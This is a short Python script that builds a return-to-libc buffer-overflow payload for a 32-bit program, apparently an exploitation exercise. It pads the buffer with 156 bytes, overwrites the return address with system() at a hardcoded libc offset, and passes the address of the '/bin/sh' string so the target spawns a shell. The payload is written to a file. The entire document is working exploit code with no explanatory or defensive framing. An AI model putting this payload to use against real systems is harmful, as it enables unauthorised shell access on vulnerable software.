import struct

libc_base_adr = 0xf7e2c000
system_adr = libc_base_adr + 0x3eed0
bin_sh_adr = libc_base_adr + 0x15d7ec

payload = b"A" * 156  # Fill up the buffer
payload += struct.pack("<I", system_adr)
payload += b"TEST"  # 4 bytes placeholder
payload += struct.pack("<I", bin_sh_adr)

with open('payload', 'wb') as f:
    f.write(payload)
